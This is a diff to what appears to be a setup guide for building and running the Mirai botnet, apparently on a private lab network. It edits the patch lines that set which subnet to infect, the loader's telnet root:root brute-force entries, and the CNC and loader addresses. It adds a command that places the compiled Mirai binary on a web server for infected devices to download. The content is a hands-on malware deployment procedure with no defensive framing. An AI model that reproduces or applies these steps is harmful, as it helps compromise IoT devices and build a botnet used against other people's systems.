@@ -3,18 +3,15 @@
 ### Step 1: modification
 
 1. **mirai.patch :**
-+    addr.sin_addr.s_addr = INET_ADDR(192,168,1,55);   // IP of the dns
 +    return INET_ADDR(192,168,o3,o4); // the network that u want to infect
 
 2. **mirai/loader/src/main.c :**
 
 - snprintf(strbuf, sizeof(strbuf), "192.168.1.%d:23 root:root", i); // the network that u want to infect
-- snprintf(strbuf, sizeof(strbuf), "192.168.%d.%d:23 root:root", o3, o4); // the network that u want to infect
 - addrs[0] = inet_addr("192.168.1.57"); // IP of the loader
 - if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL) // IP of the loader
 
 3. **router setup:**
-- echo "address=/cnc.local/192.168.1.56" | sudo tee -a /etc/dnsmasq.conf // IP of the cnc
 4. **mirai/bot/main.c**
 -      srv_addr.sin_addr.s_addr = inet_addr("172.31.29.220");  // IP du CNC
 ---
@@ -31,9 +28,9 @@ sudo apt install -y iptables-persistent  busybox-static make gcc
 
 
 # Set hostname
-echo router | sudo tee /etc/hostname
-sudo hostnamectl set-hostname router
-sudo sed -i 's/127.0.1.1.*/127.0.1.1       router/' /etc/hosts
+#echo router | sudo tee /etc/hostname
+#sudo hostnamectl set-hostname router
+#sudo sed -i 's/127.0.1.1.*/127.0.1.1       router/' /etc/hosts
 
 # Configure DNS
 #sudo systemctl stop systemd-resolved
@@ -349,6 +346,7 @@ sudo mkdir -p /var/www/html/bins
 # Copy to web server
 sudo cp ~/mirai/mirai.x86.musl /var/www/html/bins/mirai.x86
 sudo cp ~/mirai/mirai.x86.musl /var/www/html/bins/mirai.x86_64
+sudo cp ~/mirai/mirai.x86.musl /var/www/html/bins/mirai
 sudo chmod 755 /var/www/html/bins/*
 
 # Build loader (with your patch applied)
